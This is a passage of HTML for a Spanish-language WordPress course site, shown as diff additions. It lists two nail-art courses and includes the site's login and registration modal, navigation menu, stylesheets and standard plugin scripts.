+			<div class="masterstudy-lazyload-image"><img data-src="https://edu.wilanye.com/wp-content/uploads/2025/07/Post-de-Instagram-Estamos-Laborando-Minimalista-Beige_20250715_222525_0000-400x500.jpg" class="lazyload "></div>		</div>
+	</a>
+
+</div>
+	<div class="stm-lms-wishlist">
+		<a href="https://edu.wilanye.com/cuenta-del-usuario/">
+			<i class="far fa-heart"></i>
+			<span>Añadir a la lista de deseos</span>
+		</a>
+	</div>
+	
+		</div>
+
+		<div class="stm_lms_courses__single--inner">
+
+			<div class="stm_lms_courses__single--title">
+	<a href="https://edu.wilanye.com/courses/artista-en-unas-nocturno/">
+		<h5>Artista en uñas NOCTURNO</h5>
+	</a>
+</div>
+			<div class="stm_lms_courses__single--info_meta">
+					<div class="stm_lms_course__meta">
+		<i class="stmlms-level"></i>
+		Artista	</div>
+
+	<div class="stm_lms_course__meta">
+		<i class="stmlms-cats"></i>
+		24 Conferencias	</div>
+
+			</div>
+							<div class="stm_lms_courses__single--info_meta">
+										<a href="https://edu.wilanye.com/courses/artista-en-unas-nocturno/"
+						class="button">Vista previa					</a>
+				</div>
+				
+		</div>
+
+	</div>
+
+</div>
+
+<div class="stm_lms_courses__single stm_lms_courses__single_animation no-sale style_3">
+
+	<div class="stm_lms_courses__single__inner">
+
+		<div class="stm_lms_courses__single__inner__image">
+
+			
+<div class="stm_lms_courses__single--image">
+
+		<div class="featured-course-container">
+			</div>
+	
+	<a href="https://edu.wilanye.com/courses/artista-en-unas/"
+	class="heading_font"
+	data-preview="Vista previa de este curso">
+		<div class="stm_lms_courses__single--image__container" data-height=250px>
+			<div class="masterstudy-lazyload-image"><img data-src="https://edu.wilanye.com/wp-content/uploads/2025/07/Post-de-Instagram-Estamos-Laborando-Minimalista-Beige-6-scaled-400x500.jpg" class="lazyload "></div>		</div>
+	</a>
+
+</div>
+	<div class="stm-lms-wishlist">
+		<a href="https://edu.wilanye.com/cuenta-del-usuario/">
+			<i class="far fa-heart"></i>
+			<span>Añadir a la lista de deseos</span>
+		</a>
+	</div>
+	
+		</div>
+
+		<div class="stm_lms_courses__single--inner">
+
+			<div class="stm_lms_courses__single--title">
+	<a href="https://edu.wilanye.com/courses/artista-en-unas/">
+		<h5>Artista en uñas DIURNO</h5>
+	</a>
+</div>
+			<div class="stm_lms_courses__single--info_meta">
+					<div class="stm_lms_course__meta">
+		<i class="stmlms-level"></i>
+		Artista	</div>
+
+	<div class="stm_lms_course__meta">
+		<i class="stmlms-cats"></i>
+		20 Conferencias	</div>
+
+			</div>
+							<div class="stm_lms_courses__single--info_meta">
+										<a href="https://edu.wilanye.com/courses/artista-en-unas/"
+						class="button">Vista previa					</a>
+				</div>
+				
+		</div>
+
+	</div>
+
+</div>
+		</div>
+
+	<div class="showing">
+		
+<div class="text-center">
+	<a href="#"
+		class="btn btn-default stm_lms_load_more_courses"
+		data-offset="1"
+		data-url=""
+		data-args='{"per_row":"4","include_link":true,"posts_per_page":"4","image_size":"500x500","course_card_style":"style_3","course_card_info":"center","img_container_height":"250"}'>
+		<span>Cargar más</span>
+	</a>
+</div>
+	</div>
+
+</div>
+				</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				</div>
+			</div><!-- #inner-wrap -->
+	<footer id="colophon" class="site-footer" role="contentinfo">
+	<div class="site-footer-wrap">
+		<div class="site-bottom-footer-wrap site-footer-row-container site-footer-focus-item site-footer-row-layout-standard site-footer-row-tablet-layout-default site-footer-row-mobile-layout-default" data-section="kadence_customizer_footer_bottom">
+	<div class="site-footer-row-container-inner">
+				<div class="site-container">
+			<div class="site-bottom-footer-inner-wrap site-footer-row site-footer-row-columns-1 site-footer-row-column-layout-row site-footer-row-tablet-column-layout-default site-footer-row-mobile-column-layout-row ft-ro-dir-row ft-ro-collapse-normal ft-ro-t-dir-default ft-ro-m-dir-default ft-ro-lstyle-plain">
+									<div class="site-footer-bottom-section-1 site-footer-section footer-section-inner-items-1">
+						
+<div class="footer-widget-area site-info site-footer-focus-item content-align-default content-tablet-align-default content-mobile-align-default content-valign-default content-tablet-valign-default content-mobile-valign-default" data-section="kadence_customizer_footer_html">
+	<div class="footer-widget-area-inner site-info-inner">
+		<div class="footer-html inner-link-style-normal"><div class="footer-html-inner"><p>&copy; 2025 EDU WILANYE</p>
+</div></div>	</div>
+</div><!-- .site-info -->
+					</div>
+								</div>
+		</div>
+	</div>
+</div>
+	</div>
+</footer><!-- #colophon -->
+
+</div><!-- #wrapper -->
+
+<template id="tp-language" data-tp-language="es_ES"></template>			<script>document.documentElement.style.setProperty('--scrollbar-offset', window.innerWidth - document.documentElement.clientWidth + 'px' );</script>
+			<script type="speculationrules">
+{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"\/*"},{"not":{"href_matches":["\/wp-*.php","\/wp-admin\/*","\/wp-content\/uploads\/*","\/wp-content\/*","\/wp-content\/plugins\/*","\/wp-content\/themes\/kadence\/*","\/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
+</script>
+		<script type="text/javascript">
+			(function() {
+				let targetObjectName = 'EM';
+				if ( typeof window[targetObjectName] === 'object' && window[targetObjectName] !== null ) {
+					Object.assign( window[targetObjectName], []);
+				} else {
+					console.warn( 'Could not merge extra data: window.' + targetObjectName + ' not found or not an object.' );
+				}
+			})();
+		</script>
+		<script>
+var authorization_data,
+	authorization_settings;
+
+if (typeof authorization_data === 'undefined') {
+	authorization_data = {
+		'register_nonce': '01d570e320',
+		'instructor_nonce': '879241c577',
+		'login_nonce': '14bdd5bf0d',
+		'restore_nonce': '18ac6b870a',
+		'ajax_url': 'https://edu.wilanye.com/wp-admin/admin-ajax.php',
+		'email_confirmation': '',
+		'recaptcha_site_key': '',
+		'default_fields': [],
+		'additional_fields': [],
+		'instructor_fields': [],
+		'only_for_instructor': '',
+		'user_account_page': 'https://edu.wilanye.com/cuenta-del-usuario/',
+		'instructor_premoderation': '1',
+	};
+}
+if (typeof authorization_settings === 'undefined') {
+	authorization_settings = {
+		'register_mode': '',
+		'titles': {"login":{"main":"Iniciar sesi\u00f3n","account":"No?","separator":"or sign in with email"},"register":{"main":"Registro","account":"Have account?","separator":"or sign up with email"}},
+	};
+}
+</script>
+	<div class="masterstudy-authorization-modal " style="opacity:0">
+		<div class="masterstudy-authorization-modal__wrapper">
+			<div class="masterstudy-authorization-modal__container">
+				<span class="masterstudy-authorization-modal__close"></span>
+<div class="masterstudy-authorization masterstudy-authorization_style-modal masterstudy-authorization_login">
+	<div class="masterstudy-authorization__wrapper">
+		<div class="masterstudy-authorization__header">
+			<span class="masterstudy-authorization__header-title">
+				Iniciar sesión			</span>
+		</div>
+		<div id="masterstudy-authorization-form-login" class="masterstudy-authorization__form">
+	<div class="masterstudy-authorization__form-wrapper">
+		<div class="masterstudy-authorization__form-field">
+			<input type="text" name="user_login" class="masterstudy-authorization__form-input" placeholder="Introduce el correo o nombre de usuario">
+		</div>
+		<div class="masterstudy-authorization__form-field">
+			<input type="password" name="user_password" class="masterstudy-authorization__form-input masterstudy-authorization__form-input_pass" placeholder="Introduzca su contraseña">
+			<span class="masterstudy-authorization__form-show-pass"></span>
+		</div>
+	</div>
+</div>
+
+<div id="masterstudy-authorization-form-register" class="masterstudy-authorization__form">
+	<div class="masterstudy-authorization__form-wrapper">
+					<div class="masterstudy-authorization__form-field">
+				<input type="text" name="register_user_email" class="masterstudy-authorization__form-input" placeholder="Introduce tu correo electrónico">
+			</div>
+			<div class="masterstudy-authorization__form-field">
+				<input type="text" name="register_user_login" class="masterstudy-authorization__form-input" placeholder="Introduce el nombre de usuario">
+			</div>
+			<div class="masterstudy-authorization__form-field">
+				<input type="password" name="register_user_password" class="masterstudy-authorization__form-input masterstudy-authorization__form-input_pass" placeholder="Introduzca su contraseña">
+								<span class="masterstudy-authorization__form-show-pass"></span>
+								<span class="masterstudy-authorization__form-explain-pass">
+					La contraseña debe tener un mínimo de 8 caracteres de números y letras, y contener al menos 1 letra mayúscula				</span>
+							</div>
+			<div class="masterstudy-authorization__form-field">
+				<input type="password" name="register_user_password_re" class="masterstudy-authorization__form-input masterstudy-authorization__form-input_pass" placeholder="Repetir contraseña">
+				<span class="masterstudy-authorization__form-show-pass"></span>
+			</div>
+							<div class="masterstudy-authorization__instructor-container ">
+					<div class="masterstudy-authorization__form-field">
+						<input type="text" name="degree" class="masterstudy-authorization__form-input" placeholder="Introducir la titulación">
+					</div>
+					<div class="masterstudy-authorization__form-field">
+						<input type="text" name="expertize" class="masterstudy-authorization__form-input" placeholder="Enter expertize">
+					</div>
+				</div>
+					</div>
+</div>
+		<div class="masterstudy-authorization__actions">
+			<div class="masterstudy-authorization__actions-remember">
+				<div class="masterstudy-authorization__checkbox">
+					<input type="checkbox" name="masterstudy-authorization-remember" id="masterstudy-authorization-remember"/>
+					<span class="masterstudy-authorization__checkbox-wrapper"></span>
+				</div>
+				<span class="masterstudy-authorization__checkbox-title">
+					Recordarme				</span>
+			</div>
+			
+<a
+	href="#"
+			class="masterstudy-button masterstudy-button_style-primary masterstudy-button_size-sm"
+	 data-id=masterstudy-authorization-login-button>
+	<span class="masterstudy-button__title">Iniciar sesión</span>
+</a>
+			
+<a
+	href="#"
+			class="masterstudy-button masterstudy-button_style-primary masterstudy-button_size-sm"
+	 data-id=masterstudy-authorization-register-button>
+	<span class="masterstudy-button__title">Registro</span>
+</a>
+		</div>
+	</div>
+	<div class="masterstudy-authorization__restore">
+	<div class="masterstudy-authorization__restore-header">
+		<span class="masterstudy-authorization__restore-header-back"></span>
+		<span class="masterstudy-authorization__restore-header-title">
+			Restaurar la contraseña		</span>
+	</div>
+	<div id="masterstudy-authorization-form-restore" class="masterstudy-authorization__form">
+		<div class="masterstudy-authorization__form-wrapper">
+			<div class="masterstudy-authorization__form-field">
+				<input type="text" name="restore_user_login" class="masterstudy-authorization__form-input" placeholder="Introduce tu correo electrónico">
+			</div>
+		</div>
+	</div>
+	<div class="masterstudy-authorization__actions">
+		
+<a
+	href="#"
+			class="masterstudy-button masterstudy-button_style-primary masterstudy-button_size-sm"
+	 data-id=masterstudy-authorization-restore-button>
+	<span class="masterstudy-button__title">Enviar link de recuperación</span>
+</a>
+	</div>
+</div>
+
+<div id="masterstudy-authorization-restore-pass" class="masterstudy-authorization__send-mail">
+	<div class="masterstudy-authorization__send-mail-icon-wrapper">
+		<span class="masterstudy-authorization__send-mail-icon"></span>
+	</div>
+	<span class="masterstudy-authorization__send-mail-content">
+		<span class="masterstudy-authorization__send-mail-content-title">
+			Recuperar contraseña link enviado		</span>
+		<span class="masterstudy-authorization__send-mail-content-subtitle">
+			to your email		</span>
+	</span>
+	
+<a
+	href="#"
+			class="masterstudy-button masterstudy-button_style-primary masterstudy-button_size-sm"
+	 data-id=masterstudy-authorization-close-button>
+	<span class="masterstudy-button__title">Cerrar</span>
+</a>
+</div>
+
+<div class="masterstudy-authorization__instructor-confirm ">
+	<div class="masterstudy-authorization__instructor-confirm-icon-wrapper">
+		<span class="masterstudy-authorization__instructor-confirm-icon"></span>
+	</div>
+	<span class="masterstudy-authorization__instructor-confirm-title">
+		Your application is sent	</span>
+	<span class="masterstudy-authorization__instructor-confirm-instructions">
+		We&#039;ll send you an email as soon as your application is approved.	</span>
+	<span class="masterstudy-authorization__instructor-confirm-actions">
+		
+<a
+	href="https://edu.wilanye.com/cuenta-del-usuario/"
+			class="masterstudy-button masterstudy-button_style-primary masterstudy-button_size-sm"
+	 data-id=masterstudy-authorization-instructor-confirm-button>
+	<span class="masterstudy-button__title">IR A MI PERFIL</span>
+</a>
+	</span>
+</div>
+		<div class="masterstudy-authorization__switch">
+			<div class="masterstudy-authorization__switch-wrapper">
+									<div class="masterstudy-authorization__switch-account">
+						<span class="masterstudy-authorization__switch-account-title">
+							No?						</span>
+						<a href="#" id="masterstudy-authorization-sign-up" class="masterstudy-authorization__switch-account-link">
+							Registro						</a>
+						<a href="#" id="masterstudy-authorization-sign-in" class="masterstudy-authorization__switch-account-link">
+							Iniciar sesión						</a>
+					</div>
+												<span class="masterstudy-authorization__switch-lost-pass">
+						¿Recuperar contraseña?				</span>
+			</div>
+		</div>
+	</div>
+		</div>
+	</div>
+</div>
+			<script>
+				const lazyloadRunObserver = () => {
+					const lazyloadBackgrounds = document.querySelectorAll( `.e-con.e-parent:not(.e-lazyloaded)` );
+					const lazyloadBackgroundObserver = new IntersectionObserver( ( entries ) => {
+						entries.forEach( ( entry ) => {
+							if ( entry.isIntersecting ) {
+								let lazyloadBackground = entry.target;
+								if( lazyloadBackground ) {
+									lazyloadBackground.classList.add( 'e-lazyloaded' );
+								}
+								lazyloadBackgroundObserver.unobserve( entry.target );
+							}
+						});
+					}, { rootMargin: '200px 0px 200px 0px' } );
+					lazyloadBackgrounds.forEach( ( lazyloadBackground ) => {
+						lazyloadBackgroundObserver.observe( lazyloadBackground );
+					} );
+				};
+				const events = [
+					'DOMContentLoaded',
+					'elementor/lazyload/observe',
+				];
+				events.forEach( ( event ) => {
+					document.addEventListener( event, lazyloadRunObserver );
+				} );
+			</script>
+				<div id="mobile-drawer" class="popup-drawer popup-drawer-layout-sidepanel popup-drawer-animation-fade popup-drawer-side-right" data-drawer-target-string="#mobile-drawer"
+			>
+		<div class="drawer-overlay" data-drawer-target-string="#mobile-drawer"></div>
+		<div class="drawer-inner">
+						<div class="drawer-header">
+				<button class="menu-toggle-close drawer-toggle" aria-label="Cerrar menú"  data-toggle-target="#mobile-drawer" data-toggle-body-class="showing-popup-drawer-from-right" aria-expanded="false" data-set-focus=".menu-toggle-open"
+							>
+					<span class="toggle-close-bar"></span>
+					<span class="toggle-close-bar"></span>
+				</button>
+			</div>
+			<div class="drawer-content mobile-drawer-content content-align-left content-valign-top">
+								<div class="site-header-item site-header-focus-item site-header-item-mobile-navigation mobile-navigation-layout-stretch-false" data-section="kadence_customizer_mobile_navigation">
+		<nav id="mobile-site-navigation" class="mobile-navigation drawer-navigation drawer-navigation-parent-toggle-false" role="navigation" aria-label="Navegación móvil principal">
+				<div class="mobile-menu-container drawer-menu-container">
+			<ul id="mobile-menu" class="menu has-collapse-sub-nav"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-972 current_page_item menu-item-5144"><a href="https://edu.wilanye.com/" aria-current="page">INICIO</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-974"><a href="https://edu.wilanye.com/courses/">ACADEMIA</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5131"><a href="https://edu.wilanye.com/eventos/">EVENTOS</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-976"><a href="https://edu.wilanye.com/sobre/">SOBRE NOSOTROS</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-977"><a href="https://edu.wilanye.com/contact-us/">CONTACTO</a></li>
+</ul>		</div>
+	</nav><!-- #site-navigation -->
+	</div><!-- data-section="mobile_navigation" -->
+							</div>
+		</div>
+	</div>
+	<link rel='stylesheet' id='linear-css' href='https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core//libraries/nuxy/taxonomy_meta/assets/linearicons/linear.css?ver=3.6.10' media='all' />
+<link rel='stylesheet' id='courses-css' href='https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/css/parts/courses.css?ver=3.6.10' media='' />
+<link rel='stylesheet' id='course_category_style_1-css' href='https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/css/vc_modules/course_category/style_1.css?ver=3.6.10' media='' />
+<link rel='stylesheet' id='course_category_style_2-css' href='https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/css/vc_modules/course_category/style_2.css?ver=3.6.10' media='' />
+<link rel='stylesheet' id='course_category_style_3-css' href='https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/css/vc_modules/course_category/style_3.css?ver=3.6.10' media='' />
+<link rel='stylesheet' id='course_category_style_4-css' href='https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/css/vc_modules/course_category/style_4.css?ver=3.6.10' media='' />
+<link rel='stylesheet' id='course_category_style_5-css' href='https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/css/vc_modules/course_category/style_5.css?ver=3.6.10' media='' />
+<link rel='stylesheet' id='course_category_style_6-css' href='https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/css/vc_modules/course_category/style_6.css?ver=3.6.10' media='' />
+<link rel='stylesheet' id='courses_style_1-css' href='https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/css/vc_modules/courses/style_1.css?ver=3.6.10' media='' />
+<link rel='stylesheet' id='courses_style_2-css' href='https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/css/vc_modules/courses/style_2.css?ver=3.6.10' media='' />
+<link rel='stylesheet' id='courses_style_3-css' href='https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/css/vc_modules/courses/style_3.css?ver=3.6.10' media='' />
+<link rel='stylesheet' id='stm-course_category-style_2-css' href='https://edu.wilanye.com/wp-content/uploads/stm_lms_styles/vc_modules/course_category/style_2.css?ver=9139' media='all' />
+<style id='stm-course_category-style_2-inline-css'>
+.stm_lms_courses_category a:hover h4 {color: rgba(30,30,30,1)}
+</style>
+<link rel='stylesheet' id='stm-courses_grid-style_1-css' href='https://edu.wilanye.com/wp-content/uploads/stm_lms_styles/vc_modules/courses_grid/style_1.css?ver=9139' media='all' />
+<link rel='stylesheet' id='stm-lms-courses-css' href='https://edu.wilanye.com/wp-content/uploads/stm_lms_styles/parts/courses.css?ver=9139' media='all' />
+<link rel='stylesheet' id='stm-lms-courses/style_3-css' href='https://edu.wilanye.com/wp-content/uploads/stm_lms_styles/parts/courses/style_3.css?ver=9139' media='all' />
+<link rel='stylesheet' id='masterstudy_lazysizes-css' href='https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/css/lazysizes.css?ver=3.6.10' media='all' />
+<link rel='stylesheet' id='stm-lms-wishlist-css' href='https://edu.wilanye.com/wp-content/uploads/stm_lms_styles/parts/wishlist.css?ver=9139' media='all' />
+<style id='global-styles-inline-css'>
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--theme-palette-1: var(--global-palette1);--wp--preset--color--theme-palette-2: var(--global-palette2);--wp--preset--color--theme-palette-3: var(--global-palette3);--wp--preset--color--theme-palette-4: var(--global-palette4);--wp--preset--color--theme-palette-5: var(--global-palette5);--wp--preset--color--theme-palette-6: var(--global-palette6);--wp--preset--color--theme-palette-7: var(--global-palette7);--wp--preset--color--theme-palette-8: var(--global-palette8);--wp--preset--color--theme-palette-9: var(--global-palette9);--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: var(--global-font-size-small);--wp--preset--font-size--medium: var(--global-font-size-medium);--wp--preset--font-size--large: var(--global-font-size-large);--wp--preset--font-size--x-large: 42px;--wp--preset--font-size--larger: var(--global-font-size-larger);--wp--preset--font-size--xxlarge: var(--global-font-size-xxlarge);--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+</style>
+<link rel='stylesheet' id='masterstudy-authorization-css' href='https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/css/components/authorization.css?ver=3.6.10' media='all' />
+<link rel='stylesheet' id='masterstudy-button-css' href='https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core//assets/css/components/button.css?ver=3.6.10' media='all' />
+<script src="https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/vendors/bootstrap.min.js?ver=3.6.10" id="masterstudy-bootstrap-js"></script>
+<script src="https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/vendors/ms-bootstrap-custom.js?ver=3.6.10" id="masterstudy-bootstrap-custom-js"></script>
+<script src="https://edu.wilanye.com/wp-includes/js/dist/hooks.min.js?ver=4d63a3d491d11ffd8ac6" id="wp-hooks-js"></script>
+<script src="https://edu.wilanye.com/wp-includes/js/dist/i18n.min.js?ver=5e580eb46a90c2b997e6" id="wp-i18n-js"></script>
+<script id="wp-i18n-js-after">
+wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
+</script>
+<script src="https://edu.wilanye.com/wp-content/plugins/contact-form-7/includes/swv/js/index.js?ver=6.1" id="swv-js"></script>
+<script id="contact-form-7-js-translations">
+( function( domain, translations ) {
+	var localeData = translations.locale_data[ domain ] || translations.locale_data.messages;
+	localeData[""].domain = domain;
+	wp.i18n.setLocaleData( localeData, domain );
+} )( "contact-form-7", {"translation-revision-date":"2025-06-26 10:54:55+0000","generator":"GlotPress\/4.0.1","domain":"messages","locale_data":{"messages":{"":{"domain":"messages","plural-forms":"nplurals=2; plural=n != 1;","lang":"es"},"This contact form is placed in the wrong place.":["Este formulario de contacto est\u00e1 situado en el lugar incorrecto."],"Error:":["Error:"]}},"comment":{"reference":"includes\/js\/index.js"}} );
+</script>
+<script id="contact-form-7-js-before">
+var wpcf7 = {
+    "api": {
+        "root": "https:\/\/edu.wilanye.com\/wp-json\/",
+        "namespace": "contact-form-7\/v1"
+    }
+};
+</script>
+<script src="https://edu.wilanye.com/wp-content/plugins/contact-form-7/includes/js/index.js?ver=6.1" id="contact-form-7-js"></script>
